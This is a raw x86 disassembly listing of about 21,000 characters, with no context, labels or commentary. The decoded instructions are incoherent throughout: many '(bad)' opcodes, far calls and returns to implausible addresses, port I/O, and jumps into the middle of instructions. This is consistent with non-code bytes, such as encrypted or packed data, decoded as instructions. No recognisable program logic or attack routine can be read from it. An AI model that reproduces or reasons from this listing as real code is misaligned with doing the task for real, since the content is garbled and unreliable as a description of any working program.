  40e53a:	dec    ebp
  40e53b:	(bad)  
  40e53c:	mov    ebx,esp
  40e53e:	clc    
  40e53f:	test   ebx,ecx
  40e541:	clc    
  40e542:	ror    DWORD PTR [ebp-0x2a],cl
  40e545:	mov    esi,ecx
  40e547:	call   0x33cc2afb
  40e54c:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  40e553:	retf   
  40e554:	ja     0x40e524
  40e556:	mov    ebp,DWORD PTR [eax-0x48]
  40e559:	dec    ebp
  40e55a:	xor    ecx,DWORD PTR [di+0x3]
  40e55e:	mov    esp,esp
  40e560:	clc    
  40e561:	push   ebp
  40e562:	retf   
  40e563:	mov    dl,bl
  40e565:	adc    esi,edx
  40e567:	jb     0x40e537
  40e569:	add    BYTE PTR [edi-0x3b7474b3],ch
  40e56f:	call   0x4d6cb0f1
  40e574:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  40e57a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e57b:	fwait
  40e57c:	inc    ebp
  40e57d:	xor    cl,BYTE PTR [ebp-0x78]
  40e580:	mov    edx,edi
  40e582:	clc    
  40e583:	dec    ebp
  40e584:	retf   
  40e585:	mov    edx,ebx
  40e587:	call   0x560fb962
  40e58c:	scas   eax,DWORD PTR es:[edi]
  40e58d:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  40e593:	fwait
  40e594:	sub    esi,DWORD PTR [edx]
  40e596:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  40e59c:	lods   al,BYTE PTR ds:[esi]
  40e59d:	xor    esp,DWORD PTR [ebx]
  40e59f:	add    ecx,DWORD PTR [ebp-0x1c]
  40e5a2:	mov    edi,DWORD PTR [ebp-0x8]
  40e5a5:	mov    bl,cl
  40e5a7:	cmp    dl,bl
  40e5a9:	jb     0x40e579
  40e5ab:	add    dh,dl
  40e5ad:	dec    ebp
  40e5ae:	scas   eax,DWORD PTR es:[edi]
  40e5af:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  40e5b5:	shr    DWORD PTR [ebx],cl
  40e5b7:	into   
  40e5b8:	cmp    edx,esi
  40e5ba:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  40e5c0:	dec    ebp
  40e5c1:	dec    ebp
  40e5c2:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  40e5c8:	retf   
  40e5c9:	xor    edx,esi
  40e5cb:	add    ecx,esi
  40e5cd:	imul   ecx,edx
  40e5d0:	mov    DWORD PTR [ebp+0x8],edx
  40e5d3:	xor    ecx,DWORD PTR [ebp+0x2b]
  40e5d6:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  40e5dc:	add    esi,DWORD PTR [ebx]
  40e5de:	mov    ah,0x3
  40e5e0:	inc    ebp
  40e5e1:	rdtsc  
  40e5e3:	xlat   BYTE PTR ds:[ebx]
  40e5e4:	pushf  
  40e5e5:	jge    0x40e570
  40e5e7:	xor    ebx,eax
  40e5e9:	sub    eax,DWORD PTR [ebp-0x73]
  40e5ec:	(bad)  
  40e5ed:	cmp    al,al
  40e5ef:	jb     0x40e576
  40e5f1:	add    al,bh
  40e5f3:	ror    DWORD PTR [ebp-0x7a],1
  40e5f6:	xor    edi,edi
  40e5f8:	add    edi,edi
  40e5fa:	jmp    0x40e649
  40e5fc:	mov    ecx,DWORD PTR [ebx-0x34341324]
  40e602:	dec    ebp
  40e603:	into   
  40e604:	mov    ebp,DWORD PTR [edi-0x23737428]
  40e60a:	fwait
  40e60b:	shl    DWORD PTR [edx],cl
  40e60d:	retf   0x5588
  40e610:	or     ecx,DWORD PTR [ebp+0x7233114d]
  40e616:	add    eax,DWORD PTR [eax]
  40e618:	in     al,0x4d
  40e61a:	push   ebp
  40e61b:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  40e621:	gs add ch,cl
  40e624:	dec    ebp
  40e625:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  40e62b:	dec    ebp
  40e62c:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  40e632:	jge    0x40e602
  40e634:	mov    BYTE PTR [edi+0xf723b3a],ch
  40e63a:	add    cl,dh
  40e63c:	dec    ebp
  40e63d:	dec    DWORD PTR [ebx-0x2c032375]
  40e643:	adc    BYTE PTR [ebp+0x1],0x8b
  40e647:	add    al,bl
  40e649:	jge    0x40e5d7
  40e64b:	push   0xffffff9b
  40e64d:	push   0x8b3032
  40e652:	shl    BYTE PTR [ebp+0x55],0x6a
  40e656:	xor    edi,edi
  40e658:	xor    edx,DWORD PTR [ebx+eax*1]
  40e65b:	inc    ebp
  40e65c:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  40e662:	dec    ebp
  40e663:	or     BYTE PTR [ecx+0x4dc8e483],cl
  40e669:	jbe    0x40e5f6
  40e66b:	mov    ebp,esp
  40e66d:	ror    bl,1
  40e66f:	enter  0x14ce,0xaf
  40e673:	dec    DWORD PTR [ebx-0x2cef17f8]
  40e679:	push   ebp
  40e67a:	retf   0x5540
  40e67d:	push   ebp
  40e67e:	mov    esi,DWORD PTR [edx-0x1c]
  40e681:	mov    edx,ebx
  40e683:	cld    
  40e684:	(bad)  
  40e685:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  40e68c:	sti    
  40e68d:	add    dh,cl
  40e68f:	push   0xffffff94
  40e691:	call   FWORD PTR [ebx+0x3b5032d0]
  40e697:	mov    ecx,DWORD PTR [edi]
  40e699:	int3   
  40e69a:	pop    esi
  40e69b:	inc    ebp
  40e69c:	dec    DWORD PTR [ecx+0x45e8c88b]
  40e6a2:	push   ebp
  40e6a3:	xor    esi,DWORD PTR [ebx]
  40e6a5:	mov    DWORD PTR [ebx],0xcace0f9c
  40e6ab:	aas    
  40e6ac:	push   ebp
  40e6ad:	inc    ebp
  40e6ae:	xor    edx,esi
  40e6b0:	add    edx,esi
  40e6b2:	mov    eax,DWORD PTR [ebx]
  40e6b4:	(bad)  
  40e6b5:	jmp    0x40e643
  40e6b7:	mov    bl,BYTE PTR [ebx-0x7674cdfb]
  40e6bd:	rol    ah,1
  40e6bf:	mov    esi,0xf133104d
  40e6c4:	mov    edx,0xff388d80
  40e6c9:	mov    dh,0xd1
  40e6cb:	cmp    edx,DWORD PTR [ebp+0xf]
  40e6ce:	mov    eax,DWORD PTR [edx-0x20]
  40e6d1:	add    BYTE PTR [ebp-0x75],bh
  40e6d4:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  40e6db:	fwait
  40e6dc:	retf   0x8632
  40e6df:	cmp    ebp,0x8
  40e6e2:	call   ebx
  40e6e4:	inc    ebp
  40e6e5:	inc    ebp
  40e6e6:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  40e6ec:	mov    esi,DWORD PTR [ecx]
  40e6ee:	enter  0x49c,0xc7
  40e6f2:	add    al,al
  40e6f4:	add    bl,al
  40e6f6:	(bad)  
  40e6f7:	clc    
  40e6f8:	enter  0x45,0x31
  40e6fc:	push   eax
  40e6fd:	pushf  
  40e6fe:	mov    edi,eax
  40e700:	int3   
  40e701:	or     al,al
  40e703:	test   DWORD PTR [edi],edi
  40e705:	clc    
  40e706:	gs inc ebp
  40e708:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  40e70e:	push   ss
  40e70f:	xor    ecx,DWORD PTR [ebp+0x3]
  40e712:	sub    edx,DWORD PTR [ecx-0x76]
  40e715:	dec    ebp
  40e716:	add    DWORD PTR [ebx+0x88d845],ecx
  40e71c:	mov    esi,DWORD PTR [ebx]
  40e71e:	or     BYTE PTR [ebx],al
  40e720:	cmp    edx,DWORD PTR [ecx-0x38]
  40e723:	dec    ebp
  40e724:	out    dx,eax
  40e725:	xor    eax,DWORD PTR [ebp+0x3]
  40e728:	mov    edx,DWORD PTR [ecx-0x28]
  40e72b:	dec    ebp
  40e72c:	add    BYTE PTR [ebx],dh
  40e72e:	push   0x518003
  40e733:	push   eax
  40e734:	add    BYTE PTR [ebx-0x300748b],cl
  40e73a:	sbb    BYTE PTR [ebp+0x45],cl
  40e73d:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  40e743:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  40e749:	dec    ebp
  40e74a:	inc    ebp
  40e74b:	xor    edx,esi
  40e74d:	add    edx,esi
  40e74f:	push   ecx
  40e750:	(bad)  
  40e751:	dec    ebp
  40e752:	mov    al,ds:0xc5e03dff
  40e757:	retf   
  40e758:	(bad)  
  40e759:	into   
  40e75a:	sub    bh,bh
  40e75c:	dec    esp
  40e75d:	adc    al,0x9c
  40e75f:	inc    ebp
  40e760:	push   ebp
  40e761:	test   DWORD PTR [edi],ecx
  40e763:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab9ff80]
  40e76a:	jmp    0xc9b9f67e
  40e76f:	add    cl,dl
  40e771:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  40e77b:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  40e781:	rol    BYTE PTR [eax],0x54
  40e784:	clc    
  40e785:	gs jb  0x40e78f
  40e788:	mov    eax,DWORD PTR [ebp-0x30]
  40e78b:	xor    al,0x40
  40e78d:	sub    al,0xc7
  40e78f:	mov    ah,ch
  40e791:	add    DWORD PTR [ebp+0x4534f845],eax
  40e797:	sub    al,0x80
  40e799:	mov    BYTE PTR [edx+eax*1-0x335a39],bl
  40e7a0:	mov    ch,0xff
  40e7a2:	clc    
  40e7a3:	add    DWORD PTR [ebp+0x60],0x3d
  40e7a7:	call   FWORD PTR [eax+eax*1-0x1f7a77]
  40e7ae:	inc    ebp
  40e7af:	dec    DWORD PTR [ebx-0x341ff701]
  40e7b5:	test   esi,ecx
  40e7b7:	dec    DWORD PTR [ebx-0x7f8a3301]
  40e7bd:	push   eax
  40e7be:	add    DWORD PTR [ebp+0x0],eax
  40e7c1:	dec    ebx
  40e7c3:	or     al,0xce
  40e7c5:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  40e7cc:	into   
  40e7cd:	add    BYTE PTR [ebx-0x34ff1400],cl
  40e7d3:	mov    esi,ecx
  40e7d5:	sar    bh,0x45
  40e7d8:	adc    al,0x8b
  40e7da:	clc    
  40e7db:	fadd   DWORD PTR [ebp+0x0]
  40e7de:	mov    ebp,DWORD PTR [edx+0x8]
  40e7e1:	push   edi
  40e7e2:	adc    BYTE PTR [eax+0x1],0x83
  40e7e6:	add    al,al
  40e7e8:	retf   
  40e7e9:	mov    ecx,esi
  40e7eb:	cld    
  40e7ec:	mov    eax,DWORD PTR [eax+0xcb01cc]
  40e7f2:	into   
  40e7f3:	add    BYTE PTR [ebx+0x756aec00],cl
  40e7f9:	jne    0x40e82e
  40e7fb:	inc    DWORD PTR [ebx]
  40e7fd:	rcl    BYTE PTR [ecx+0x50],1
  40e800:	push   eax
  40e801:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  40e807:	mov    eax,DWORD PTR [eax+eiz*8-0x14ffbafd]
  40e80e:	sar    bh,0x84
  40e811:	or     BYTE PTR [ebx],al
  40e813:	push   eax
  40e814:	add    BYTE PTR [ebx+0x453cc845],cl
  40e81a:	pushf  
  40e81b:	xor    edi,eax
  40e81d:	pushf  
  40e81e:	mov    ah,0x89
  40e820:	test   eax,ebp
  40e822:	clc    
  40e823:	inc    ebp
  40e824:	inc    ebp
  40e825:	mov    DWORD PTR [eax+eax*8],esi
  40e828:	sub    al,0x32
  40e82a:	mov    BYTE PTR [ebx+ecx*4+0x54d8ec89],bl
  40e831:	dec    ebp
  40e832:	xor    eax,DWORD PTR gs:[edi+0x3]
  40e836:	mov    ecx,DWORD PTR [ecx+0x4d54f4b4]
  40e83c:	xor    eax,DWORD PTR gs:[edi+0x3]
  40e840:	or     DWORD PTR [ecx+0x45ff085c],0x0
  40e847:	shl    DWORD PTR [ebp-0x380064],1
  40e84d:	int3   
  40e84e:	lea    eax,[ebp+0x45fff860]
  40e854:	push   eax
  40e855:	cmp    al,0x75
  40e857:	pushf  
  40e858:	(bad)  
  40e859:	(bad)  
  40e85a:	pop    esp
  40e85b:	lods   al,BYTE PTR ds:[esi]
  40e85c:	inc    DWORD PTR [ebp+0x4508f8ff]
  40e862:	mov    edi,DWORD PTR [esi]
  40e864:	rcr    BYTE PTR [eax+esi*2+0x10b883c7],1
  40e86b:	test   DWORD PTR [edi-0x8],edx
  40e86e:	inc    esi
  40e86f:	inc    ebp
  40e870:	add    BYTE PTR [eax],bh
  40e872:	push   0x8b809c
  40e877:	in     al,dx
  40e878:	inc    ebp
  40e879:	push   ebp
  40e87a:	mov    esi,DWORD PTR [ebx]
  40e87c:	cld    
  40e87d:	add    eax,DWORD PTR [eax+0xf013b]
  40e883:	adc    al,0x0
  40e885:	add    bh,bh
  40e887:	jmp    0xbde9a4
  40e88c:	add    BYTE PTR [ebp+0x45],cl
  40e88f:	mov    ecx,DWORD PTR [ebx+0xd1d8e8]
  40e895:	dec    ebp
  40e896:	push   0x38033
  40e89b:	cmp    eax,DWORD PTR [eax]
  40e89d:	unpcklps xmm7,xmm0
  40e8a0:	jne    0x40e8a2
  40e8a2:	dec    DWORD PTR [ebx+0x5545cc18]
  40e8a8:	mov    DWORD PTR [ebx],esi
  40e8aa:	shl    BYTE PTR [ebx],1
  40e8ac:	inc    ebp
  40e8ad:	add    ecx,DWORD PTR [ecx+0x60fc803]
  40e8b3:	retf   0x5575
  40e8b6:	dec    DWORD PTR [ebx-0x5ba17e8]
  40e8bc:	(bad)  
  40e8bd:	stc    
  40e8be:	in     al,dx
  40e8bf:	or     al,0x85
  40e8c1:	dec    ebp
  40e8c2:	clc    
  40e8c3:	xor    eax,DWORD PTR [ebp+0x3]
  40e8c6:	mov    ebp,ecx
  40e8c8:	rol    BYTE PTR [eax],1
  40e8ca:	inc    ebp
  40e8cb:	add    BYTE PTR [eax-0x7747ab3],bh
  40e8d1:	clc    
  40e8d2:	inc    ebp
  40e8d3:	retf   
  40e8d4:	mov    edx,ebx
  40e8d6:	in     al,dx
  40e8d7:	(bad)  
  40e8d8:	retf   
  40e8d9:	into   
  40e8da:	into   
  40e8db:	scas   eax,DWORD PTR es:[edi]
  40e8dc:	dec    ebp
  40e8dd:	mov    ecx,DWORD PTR [ebx-0x3482130c]
  40e8e3:	sub    ecx,esi
  40e8e5:	cmp    ecx,DWORD PTR [ebp+0x77]
  40e8e8:	(bad)  
  40e8e9:	mov    edi,eax
  40e8eb:	int3   
  40e8ec:	test   DWORD PTR [ecx-0x74baff08],ecx
  40e8f2:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  40e8f9:	xor    eax,DWORD PTR [ebp+0x4503f803]
  40e8ff:	(bad)  
  40e901:	retf   0x559c
  40e904:	(bad)  
  40e905:	mov    esp,DWORD PTR [eax+ebp*8-0x607057b]
  40e90c:	inc    ebp
  40e90d:	add    eax,0xeb9c4d3f
  40e912:	(bad)  
  40e913:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  40e919:	xor    ecx,DWORD PTR [ebp+0x33]
  40e91c:	mov    eax,DWORD PTR [ebx]
  40e91e:	call   0xce50b426
  40e923:	retf   0x55d1
  40e926:	test   BYTE PTR [ebx-0x5ff17fe],cl
  40e92c:	jmp    0x40e927
  40e92e:	add    BYTE PTR ds:0xebf44d8b,al
  40e934:	push   ebp
  40e935:	mov    ebp,DWORD PTR [ebx]
  40e937:	mov    eax,0x33f8558b
  40e93c:	retf   
  40e93d:	xor    ecx,esi
  40e93f:	add    edx,ecx
  40e941:	add    eax,DWORD PTR [edx+0xca010f]
  40e947:	push   ebp
  40e948:	dec    ebp
  40e949:	mov    ecx,DWORD PTR [ebx-0x34050718]
  40e94f:	stc    
  40e950:	rol    DWORD PTR ds:0xebce4dd6,cl
  40e956:	scas   eax,DWORD PTR es:[edi]
  40e957:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  40e95d:	xor    ebp,DWORD PTR [ebx]
  40e95f:	xor    edi,DWORD PTR [ebx]
  40e961:	add    esi,DWORD PTR [edi+0x3]
  40e964:	mov    ecx,DWORD PTR [edi]
  40e966:	clc    
  40e967:	retf   0x55cb
  40e96a:	into   
  40e96b:	mov    edi,DWORD PTR [eax+ebp*8-0x6740600]
  40e972:	test   al,0x4d
  40e974:	push   ebp
  40e975:	jbe    0x40e9aa
  40e977:	mov    esi,DWORD PTR [ebx]
  40e979:	mov    al,0x3
  40e97b:	push   ebp
  40e97c:	add    esi,DWORD PTR [ebx]
  40e97e:	rdpmc  
  40e980:	retf   0x5503
  40e983:	add    ecx,DWORD PTR [ebx-0x53517f1]
  40e989:	dec    ebp
  40e98a:	stc    
  40e98b:	mov    ecx,DWORD PTR [eax]
  40e98d:	or     BYTE PTR [ebp+0x4d],cl
  40e990:	jmp    0x134ea20
  40e995:	dec    ebp
  40e996:	dec    ebp
  40e997:	(bad)  
  40e998:	mov    ebx,esp
  40e99a:	clc    
  40e99b:	test   ebx,ecx
  40e99d:	clc    
  40e99e:	ror    DWORD PTR [ebp-0x2a],cl
  40e9a1:	mov    esi,ecx
  40e9a3:	lock scas eax,DWORD PTR es:[edi]
  40e9a5:	inc    ebp
  40e9a6:	mov    esi,DWORD PTR [ebx]
  40e9a8:	hlt    
  40e9a9:	pushf  
  40e9aa:	jge    0x40e937
  40e9ac:	sub    ebx,esp
  40e9ae:	cmp    ecx,ebx
  40e9b0:	ja     0x40e980
  40e9b2:	mov    ebp,DWORD PTR [eax-0x58]
  40e9b5:	dec    ebp
  40e9b6:	xor    ecx,DWORD PTR [di+0x3]
  40e9ba:	mov    esp,esp
  40e9bc:	clc    
  40e9bd:	push   ebp
  40e9be:	retf   
  40e9bf:	mov    dl,bl
  40e9c1:	adc    esi,edx
  40e9c3:	jb     0x40e993
  40e9c5:	add    BYTE PTR [edi-0xb7474b3],ch
  40e9cb:	lock jge 0x40e999
  40e9ce:	sub    ecx,DWORD PTR [ebp+0x3b]
  40e9d1:	mov    esi,DWORD PTR [edi-0x20]
  40e9d4:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459b]
  40e9db:	mov    BYTE PTR [ebx-0x34b20729],cl
  40e9e1:	mov    edx,ebx
  40e9e3:	lock (bad) 
  40e9e5:	ror    esi,cl
  40e9e7:	push   ebp
  40e9e8:	scas   eax,DWORD PTR es:[edi]
  40e9e9:	mov    ecx,DWORD PTR [ebx+0x7d8cf4e0]
  40e9ef:	fwait
  40e9f0:	sub    esi,DWORD PTR [edx]
  40e9f2:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  40e9f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e9f9:	xor    esp,DWORD PTR [ebx]
  40e9fb:	add    ecx,DWORD PTR [ebp-0x1c]
  40e9fe:	mov    edi,DWORD PTR [ebp-0x8]
  40ea01:	mov    bl,cl
  40ea03:	cmp    dl,bl
  40ea05:	jb     0x40e9d5
  40ea07:	add    dh,dl
  40ea09:	dec    ebp
  40ea0a:	scas   eax,DWORD PTR es:[edi]
  40ea0b:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  40ea11:	shr    DWORD PTR [ebx],cl
  40ea13:	into   
  40ea14:	cmp    edx,esi
  40ea16:	mov    ebp,DWORD PTR [edi-0x1bfcfc48]
  40ea1c:	dec    ebp
  40ea1d:	dec    ebp
  40ea1e:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  40ea24:	retf   
  40ea25:	xor    edx,esi
  40ea27:	add    ecx,esi
  40ea29:	imul   ecx,edx
  40ea2c:	mov    DWORD PTR [ebp+0x8],edx
  40ea2f:	xor    ecx,DWORD PTR [ebp+0x2b]
  40ea32:	mov    DWORD PTR [ebx+0x7d4df0ec],ecx
  40ea38:	add    esi,DWORD PTR [ebx]
  40ea3a:	rol    BYTE PTR [ebx],0x45
  40ea3d:	rdtsc  
  40ea3f:	xlat   BYTE PTR ds:[ebx]
  40ea40:	pushf  
  40ea41:	jge    0x40e9cc
  40ea43:	xor    esp,eax
  40ea45:	sub    eax,DWORD PTR [ebp-0x73]
  40ea48:	(bad)  
  40ea49:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  40ea50:	dec    ebp
  40ea51:	xchg   BYTE PTR [ebx],dh
  40ea53:	inc    DWORD PTR [ebx]
  40ea55:	(bad)  
  40ea56:	jmp    0x40eaa5
  40ea58:	mov    ecx,DWORD PTR [ebx-0x34341324]
  40ea5e:	dec    ebp
  40ea5f:	into   
  40ea60:	mov    ebp,DWORD PTR [edi-0x23737420]
  40ea66:	fwait
  40ea67:	shl    DWORD PTR [edx],cl
  40ea69:	retf   0x5588
  40ea6c:	or     ecx,DWORD PTR [ebp+0x7233114d]
  40ea72:	add    eax,DWORD PTR [eax]
  40ea74:	in     al,0x4d
  40ea76:	push   ebp
  40ea77:	mov    ecx,DWORD PTR [edx+0x72cb11d8]
  40ea7d:	gs add ch,cl
  40ea80:	dec    ebp
  40ea81:	sub    ecx,DWORD PTR [edx+0x55e80b03]
  40ea87:	dec    ebp
  40ea88:	xor    ecx,DWORD PTR [ebx-0x341b0bfd]
  40ea8e:	jge    0x40ea5e
  40ea90:	mov    BYTE PTR [edi+0xf723b3a],ch
  40ea96:	add    cl,dh
  40ea98:	dec    ebp
  40ea99:	dec    DWORD PTR [ebx-0x2c032301]
  40ea9f:	inc    ebp
  40eaa0:	push   ebp
  40eaa1:	dec    DWORD PTR [ebx-0x73ff1f34]
  40eaa7:	lea    ebx,[ebx-0x7400cdac]
  40eaad:	push   eax
  40eaae:	mov    ah,0x45
  40eab0:	push   ebp
  40eab1:	mov    esi,DWORD PTR [ebx]
  40eab3:	les    esi,FWORD PTR [ebx]
  40eab5:	add    BYTE PTR [ebx],al
  40eab7:	inc    DWORD PTR [ebx]
  40eab9:	mov    ecx,DWORD PTR [edi]
  40eabb:	cld    
  40eabc:	retf   0x4d80
  40eabf:	add    DWORD PTR [ecx+0x4d30e400],ecx
  40eac5:	jne    0x40ea52
  40eac7:	(bad)  
  40eac8:	in     al,dx
  40eac9:	ror    bl,1
  40eacb:	scas   al,BYTE PTR es:[edi]
  40eacc:	into   
  40eacd:	add    BYTE PTR [edi-0xf2f7475],ch
  40ead3:	not    bl
  40ead5:	adc    al,0xca
  40ead7:	inc    ebp
  40ead8:	push   ebp
  40ead9:	mov    ecx,DWORD PTR [ebx-0x2cff1b28]
  40eadf:	push   0xaf80d6
  40eae4:	mov    eax,DWORD PTR [eax]
  40eae6:	fdiv   st(7),st
  40eae8:	sti    
  40eae9:	sbb    dh,cl
  40eaeb:	pop    esi
  40eaec:	xchg   esp,eax
  40eaed:	leave  
  40eaee:	fwait
  40eaef:	add    al,0x32
  40eaf1:	push   ebp
  40eaf2:	cmp    ebp,esp
  40eaf4:	sqrtps xmm3,XMMWORD PTR [esi+0x45]
  40eaf8:	dec    DWORD PTR [ecx-0x740f0375]
  40eafe:	push   ebp
  40eaff:	cld    
  40eb00:	xor    ecx,DWORD PTR [edi-0x76f07efd]
  40eb06:	retf   0x558b
  40eb09:	clc    
  40eb0a:	xor    esi,eax
  40eb0c:	add    esi,DWORD PTR [ebp-0x75]
  40eb0f:	(bad)  
  40eb10:	hlt    
  40eb11:	or     cl,BYTE PTR [esi+eax*8-0x39cdf765]
  40eb18:	mov    DWORD PTR [edx],ecx
  40eb1a:	hlt    
  40eb1b:	(bad)  
  40eb1c:	dec    ebp
  40eb1d:	add    dh,BYTE PTR [ebx]
  40eb1f:	leave  
  40eb20:	mov    edx,0xffec8d55
  40eb25:	push   ecx
  40eb26:	rol    DWORD PTR [ebp+0x55],1
  40eb29:	mov    DWORD PTR [ebx+0x7d55d8fc],ecx
  40eb2f:	mov    eax,0xf8030b33
  40eb34:	lar    ecx,di
  40eb37:	push   ebp
  40eb38:	retf   0x863b
  40eb3b:	jne    0x40eb3a
  40eb3d:	mov    edi,edi
  40eb3f:	or     BYTE PTR [ebp+0x41],dh
  40eb42:	mov    ebp,edx
  40eb44:	cld    
  40eb45:	inc    eax
  40eb46:	mov    al,0x25
  40eb48:	add    DWORD PTR [ecx+0x0],eax
  40eb4b:	in     eax,dx
  40eb4c:	test   DWORD PTR [ecx-0x1],eax
  40eb4f:	(bad)  
  40eb51:	ret    0x8b
  40eb54:	cld    
  40eb55:	mov    eax,DWORD PTR [eax+0x8d0151]
  40eb5b:	clc    
  40eb5c:	xor    BYTE PTR [ebp+0x45],al
  40eb5f:	mov    ecx,DWORD PTR [ebx+0x8fc0fc]
  40eb65:	loopne 0x40eb66
  40eb67:	mov    edi,edi
  40eb69:	mov    ecx,eax
  40eb6b:	clc    
  40eb6c:	jne    0x40eb3e
  40eb6e:	call   0x81fc77
  40eb73:	and    eax,0xc6854575
  40eb78:	je     0x40eb7b
  40eb7a:	mov    eax,esi
  40eb7c:	cld    
  40eb7d:	or     DWORD PTR [eax+0x401c9],eax
  40eb83:	push   ebp
  40eb84:	add    ah,ch
  40eb86:	add    BYTE PTR [ecx+0x6a],dl
  40eb89:	inc    ebp
  40eb8a:	push   esi
  40eb8b:	mov    DWORD PTR [eax-0x4],edx
  40eb8e:	pop    edi
  40eb8f:	mov    ebx,DWORD PTR [ebx-0x4]
  40eb92:	ret    0xb8
  40eb95:	push   es
  40eb96:	mov    ecx,DWORD PTR [ecx-0x77274af]
  40eb9c:	clc    
  40eb9d:	lock inc ebp
  40eb9f:	jne    0x40ebf7
  40eba1:	(bad)  
  40eba2:	jne    0x40eba8
  40eba4:	mov    eax,0xf841ba66
  40eba9:	fiadd  DWORD PTR [esi]
  40ebab:	(bad)  
  40ebac:	jne    0x40ebeb
  40ebae:	cmp    eax,ebx
  40ebb0:	pop    esi
  40ebb1:	mov    ecx,DWORD PTR [eax]
  40ebb3:	push   ecx
  40ebb4:	inc    ecx
  40ebb5:	lea    edi,[esi-0x8]
  40ebb8:	inc    edx
  40ebb9:	inc    ebp
  40ebba:	int    0x8b
  40ebbc:	inc    edx
  40ebbd:	cld    
  40ebbe:	jle    0x40eb7f
  40ebc0:	inc    ecx
  40ebc1:	xchg   eax,esp
  40ebc3:	mov    ebx,eax
  40ebc5:	mov    ecx,DWORD PTR [ebx-0x722fae08]
  40ebcb:	or     edi,eax
  40ebcd:	inc    ebp
  40ebce:	inc    ebp
  40ebcf:	(bad)  
  40ebd0:	mov    ecx,DWORD PTR [eax]
  40ebd2:	cld    
  40ebd3:	(bad)  
  40ebd4:	jmp    0x40ebd7
  40ebd6:	mov    eax,esi
  40ebd8:	mov    DWORD PTR ds:0x4f8c98b,eax
  40ebde:	rcl    BYTE PTR [esi+0xf],1
  40ebe1:	iret   
  40ebe2:	inc    ebp
  40ebe3:	leave  
  40ebe4:	(bad)  
  40ebe5:	dec    DWORD PTR [ecx]
  40ebe7:	mov    eax,esi
  40ebe9:	mov    eax,DWORD PTR [edi]
  40ebeb:	mov    dh,0xdd
  40ebee:	push   es
  40ebef:	nop
  40ebf0:	(bad)  
  40ebf1:	inc    DWORD PTR [ebx]
  40ebf3:	push   esi
  40ebf4:	leave  
  40ebf5:	iret   
  40ebf6:	add    al,0x46
  40ebf8:	push   ebp
  40ebf9:	jmp    0xff9241ea
  40ebfe:	inc    ebp
  40ebff:	push   esi
  40ec00:	mov    DWORD PTR [esi-0x4],eax
  40ec03:	in     eax,dx
  40ec04:	push   ebp
  40ec05:	sbb    BYTE PTR [eax+0x7c6daff],bh
  40ec0b:	add    al,BYTE PTR [edx]
  40ec0d:	mov    edx,DWORD PTR [ebp-0x17]
  40ec10:	cmp    edi,esi
  40ec12:	jne    0x40ec13
  40ec14:	(bad)  
  40ec15:	push   esi
  40ec16:	pop    es
  40ec17:	push   ebp
  40ec18:	mov    ebp,esp
  40ec1a:	or     BYTE PTR [ebp+0x41],al
  40ec1d:	add    edi,esp
  40ec1f:	sub    BYTE PTR [eax-0x4],al
  40ec22:	retf   0xc275
  40ec25:	add    DWORD PTR [eax],eax
  40ec27:	sbb    al,0x8b
  40ec29:	mov    edx,DWORD PTR [ecx+0x14]
  40ec2c:	lea    edx,[edx-0x1ba7508]
  40ec32:	push   esi
  40ec33:	enter  0xd375,0xb8
  40ec37:	test   DWORD PTR [esi],0x6ce0750
  40ec3d:	enter  0xd375,0x3b
  40ec41:	neg    DWORD PTR [esi+0x50]
  40ec44:	or     cl,dl
  40ec46:	inc    edx
  40ec47:	(bad)  
  40ec48:	loope  0x40ec36
  40ec4a:	(bad)  
  40ec4b:	sub    eax,DWORD PTR [ebx]
  40ec4d:	inc    eax
  40ec4e:	loope  0x40eca0
  40ec50:	add    dl,BYTE PTR [eax-0x37]
  40ec53:	push   edi
  40ec54:	push   ebp
  40ec55:	imul   ah
  40ec57:	adc    DWORD PTR [ecx-0x1],0x45
  40ec5b:	add    BYTE PTR [ecx+0x55d3fc00],cl
  40ec61:	lea    edi,[eax-0x7fff4ca]
  40ec67:	mov    eax,0x4550402
  40ec6c:	cmp    ebp,ecx
  40ec6e:	jne    0x40ec1b
  40ec70:	mov    eax,DWORD PTR ds:0x241e808
  40ec76:	in     eax,dx
  40ec77:	add    BYTE PTR [eax-0x7],al
  40ec7a:	out    0x36,eax
  40ec7c:	inc    ecx
  40ec7d:	aas    
  40ec7e:	jmp    0xccaf00
  40ec83:	lock mov edi,DWORD PTR [ebp-0x18]
  40ec87:	and    edi,edi
  40ec89:	mov    edi,edi
  40ec8b:	call   0xe40eed67
  40ec90:	push   es
  40ec91:	add    al,ch
  40ec93:	ud0    edx,DWORD PTR [ebp-0x7574ff01]
  40ec9a:	(bad)  
  40ec9b:	hlt    
  40ec9c:	add    eax,0xffd3e87d
  40eca1:	cmp    bh,0x8
  40eca4:	(bad)  
  40eca5:	fld    DWORD PTR [esi]
  40eca7:	out    dx,al
  40eca8:	call   0xff9febb0
